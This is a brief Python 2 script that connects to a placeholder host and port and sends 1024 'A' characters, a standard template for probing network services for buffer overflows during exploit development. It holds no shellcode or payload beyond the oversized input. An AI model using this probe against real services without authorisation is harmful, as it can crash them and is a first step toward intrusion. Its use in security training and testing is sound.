#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "0.0.0.0"
RPORT = 12345

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build payload followed by a newline
buf = ""
buf += "A" * 1024
buf += "\n"

# send payload down the socket
s.send(buf)

# print out what we sent
print "Sent: {0}".format(buf)

# receive some data from the socket
resp = s.recv(1024)

# print out what we received
print "Received: {0}".format(resp)
